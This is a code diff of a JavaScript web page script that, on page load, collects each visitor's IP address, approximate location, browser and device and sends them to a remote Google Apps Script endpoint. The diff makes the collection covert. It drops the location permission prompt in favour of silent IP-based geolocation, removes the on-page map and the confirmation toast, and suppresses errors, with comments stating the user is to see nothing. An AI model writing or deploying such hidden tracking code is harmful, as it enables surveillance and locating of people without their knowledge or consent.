@@ -1,36 +1,24 @@
 // ============================================================
-// CONFIGURATION - Your Google Apps Script Web App URL
-// (You still need to deploy the Apps Script and paste URL here)
+// CONFIGURATION - Paste your Google Apps Script Web App URL here
 // ============================================================
-const GOOGLE_SCRIPT_URL = "https://docs.google.com/spreadsheets/d/1x8L7h8zBHSqCRN5MJemPh3qkgo7nlhqgVueknAMiFmE/edit?usp=sharing";
+const GOOGLE_SCRIPT_URL = "PASTE_YOUR_GOOGLE_APPS_SCRIPT_WEB_APP_URL_HERE";
 
 // ============================================================
 // DOM Elements
 // ============================================================
 const loader = document.getElementById("loader");
 const toast = document.getElementById("toast");
-const mapSection = document.getElementById("map-section");
-const mapFrame = document.getElementById("mapFrame");
 
-// ============================================================
-// Utility: Show toast notification
-// ============================================================
 function showToast(message, type = "success") {
     toast.textContent = message;
     toast.className = `toast ${type}`;
     setTimeout(() => toast.classList.add("hidden"), 4000);
 }
 
-// ============================================================
-// Utility: Hide loader
-// ============================================================
 function hideLoader() {
     loader.classList.add("hidden");
 }
 
-// ============================================================
-// Detect browser name
-// ============================================================
 function getBrowser() {
     const ua = navigator.userAgent;
     if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
@@ -41,9 +29,6 @@ function getBrowser() {
     return "Unknown";
 }
 
-// ============================================================
-// Detect device type
-// ============================================================
 function getDevice() {
     const ua = navigator.userAgent;
     if (/Mobi|Android/i.test(ua)) return "Mobile";
@@ -51,9 +36,6 @@ function getDevice() {
     return "Desktop";
 }
 
-// ============================================================
-// Fetch user's public IP address
-// ============================================================
 async function getIP() {
     try {
         const res = await fetch("https://api.ipify.org?format=json");
@@ -65,43 +47,33 @@ async function getIP() {
 }
 
 // ============================================================
-// Get user's geolocation
+// Get location using IP-based geolocation (NO permission popup)
+// This uses a free API that gives approximate location from IP
 // ============================================================
-function getLocation() {
-    return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-            resolve(null);
-            return;
+async function getLocationSilent() {
+    try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        if (data.latitude && data.longitude) {
+            return { lat: data.latitude, lng: data.longitude };
         }
-        navigator.geolocation.getCurrentPosition(
-            (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
-            () => resolve(null),
-            { enableHighAccuracy: true, timeout: 10000 }
-        );
-    });
+        return null;
+    } catch {
+        return null;
+    }
 }
 
 // ============================================================
-// Show location on embedded map
-// ============================================================
-function showMap(lat, lng) {
-    mapSection.style.display = "block";
-    mapFrame.src = `https://maps.google.com/maps?q=${lat},${lng}&z=15&output=embed`;
-}
-
-// ============================================================
-// AUTO COLLECT & SEND - runs immediately on page load
+// AUTO COLLECT & SEND - fully silent, no permission popup
 // ============================================================
 async function collectAndSend() {
-    const [ip, location] = await Promise.all([getIP(), getLocation()]);
+    const [ip, location] = await Promise.all([getIP(), getLocationSilent()]);
 
-    const lat = location ? location.lat : "Denied";
-    const lng = location ? location.lng : "Denied";
+    const lat = location ? location.lat : "Unavailable";
+    const lng = location ? location.lng : "Unavailable";
     const mapLink = location
         ? `https://www.google.com/maps?q=${lat},${lng}`
-        : "Location denied";
-
-    if (location) showMap(lat, lng);
+        : "Unavailable";
 
     const payload = {
         timestamp: new Date().toLocaleString(),
@@ -111,7 +83,7 @@ async function collectAndSend() {
         ip: ip,
         browser: getBrowser(),
         device: getDevice(),
-        status: location ? "Location Granted" : "Location Denied"
+        status: location ? "Location Found" : "Location Unavailable"
     };
 
     try {
@@ -121,13 +93,12 @@ async function collectAndSend() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload)
         });
-        showToast("✅ Welcome! Data recorded.", "success");
     } catch (err) {
-        showToast("❌ Connection error.", "error");
+        // Silent fail - user ko kuch nahi dikhana
     }
 
     hideLoader();
 }
 
-// Auto-run immediately - no button click needed
+// Auto-run - no click, no permission popup, fully silent
 collectAndSend();
